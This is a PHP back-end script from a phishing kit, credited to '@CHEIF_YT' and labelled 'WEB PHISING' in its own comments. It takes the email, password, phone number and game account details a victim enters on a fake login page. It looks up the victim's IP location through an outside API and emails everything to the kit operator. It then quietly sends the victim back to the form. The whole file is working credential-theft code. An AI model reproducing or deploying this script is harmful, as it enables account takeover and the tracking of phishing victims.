<?php

    // ===============================================================
    // 	Coding by @CHEIF_YT ( @CHEIF_YT )
    // ===============================================================
    
    date_default_timezone_set('Asia/Kolkata');
    $jamasuk = date('l, d/m/y h:i:s');
    $tanggal = date('l, d-m-Y');
    $yearNow = date('Y');
    $yearswat = date('y');
    $swat1 = date('d/m/y-h:i');
    
    // ===============================================================
    // 	Coding by @CHEIF_YT ( @CHEIF_YT )
    // ===============================================================

    function getClientIP(){
        foreach (array('HTTP_CLIENT_IP',
                       'HTTP_X_FORWARDED_FOR',
                       'HTTP_X_FORWARDED',
                       'HTTP_X_CLUSTER_CLIENT_IP',
                       'HTTP_FORWARDED_FOR',
                       'HTTP_FORWARDED',
                       'REMOTE_ADDR') as $key){
                            if (array_key_exists($key, $_SERVER) === true){
                                foreach (explode(',', $_SERVER[$key]) as $IP){
                                    $IP = trim($IP);
                                    if (filter_var($IP,
                                                   FILTER_VALIDATE_IP,
                                                   FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                                        !== false) {
                                            return $IP;
                                    }
                                }
                            }
        }
    };
    
    // ===============================================================
    // 	Coding by @CHEIF_YT ( @CHEIF_YT )
    // ===============================================================

    $SWATcURL = curl_init();
    curl_setopt($SWATcURL, CURLOPT_URL,"https://api.ipapi.biz/api/?ip=".getClientIP().""); 
    curl_setopt($SWATcURL, CURLOPT_RETURNTRANSFER, true);
    $HasilcURL = curl_exec($SWATcURL); curl_close ($SWATcURL);
    $HasilcURL = json_decode($HasilcURL,true);
    
    // ===============================================================
    // 	Coding by @CHEIF_YT ( @CHEIF_YT )
    // ===============================================================

    $continent_ip = $HasilcURL['continent'];
    $country_ip = $HasilcURL['country'];
    $country2 = $HasilcURL['country'];
    $city_ip = $HasilcURL['city'];
    $region_ip = $HasilcURL['region'];
    $callcode_ip = $HasilcURL['code'];
    $lat_ip = $HasilcURL['latitude'];
    $lon_ip = $HasilcURL['longitude'];
    $ipaddress = ''.getClientIP().' ('.$HasilcURL['typeip'].')';
    $flag = $HasilcURL['flag01'];
    $hflag = $HasilcURL['flag'];
    $zone = $HasilcURL['timezone'];
    $provider = $HasilcURL['isp'];

    // ===============================================================
    // 	Coding by @CHEIF_YT ( @CHEIF_YT )
    // ===============================================================


    include 'email.php';
    $email = $_POST['email'];
    $password = $_POST['password'];
    $playid = $_POST['playid'];
    $phone = $_POST['phone'];
    $level = $_POST['level'];
    $login = $_POST['login'];

    $topic = "$flag | LEVEL $level | $playid | $login | $email";

    $message = '
    
    <!-- @CHEIF_YT WEB PHISING -->
    <center> 
        <div border="1" style="border-collapse: collapse; border: 1px solid black; background: url('.$banner.') no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center;"></div>
        <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 5px;">Account Information | Sent : '.$jamasuk.'</div>
        <table border="1" bordercolor="#19233f" style="color:#000;border-radius:8px; border:3px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
            <!-- @CHEIF_YT WEB PHISING -->
<th style="width: 22%; text-align: left;" height="25px;color:black;"><b style = "color:black;">EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;color:black;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px;color:black;"><b style = "color:black;">PASSWORD</th>
<th style="width: 78%; text-align: center;color:black;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b style = "color:black;">PHONE NO.</th>
<th style="width: 78%; text-align: center;color:black;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b style = "color:black;">CHARACTER ID</th>
<th style="width: 78%; text-align: center;color:black;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b style = "color:black;">LEVEL</th>
<th style="width: 78%; text-align: center;color:black;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b style = "color:black;">LOGIN</th>
<th style="width: 78%; text-align: center;color:black;"><b>'.$login.'</th> 
</tr>
            </tr>
            <!-- @CHEIF_YT WEB PHISING -->
        </table>
        <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 5px;">More Information</div>
        '.$more.'
        <br />
        <table border="1" bordercolor="#19233f" style="color:#000;border-radius:8px; border:3px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
            <!-- @CHEIF_YT WEB PHISING -->
            <tr>
        </table>
    </center>
    <br />
    
    ';

    $headers  = "".'MIME-Version: 1.0'."\r\n";
    $headers .= "".'Content-type: text/html; charset=utf-8'."\r\n";
    $headers .= "".$sender."\r\n";
    $headers .= "".'Content-Transfer-Encoding: 8bit'."\r\n";
    $headers .= "".'Sensitivity: Company-Confidential'."\r\n";
    $headers .= "".'X-Mailer: PHP/'.phpversion()."\r\n";
    $send = mail($imel, $topic, $message, $headers);
    
    if($send) {
        
        echo "<form id='FormSWAT' method='POST' action='index.php'>
              </form>
              <script type='text/javascript'>
                    document.getElementById('FormSWAT').submit();
              </script>";
              
    }
header("Location: index.php")
?>
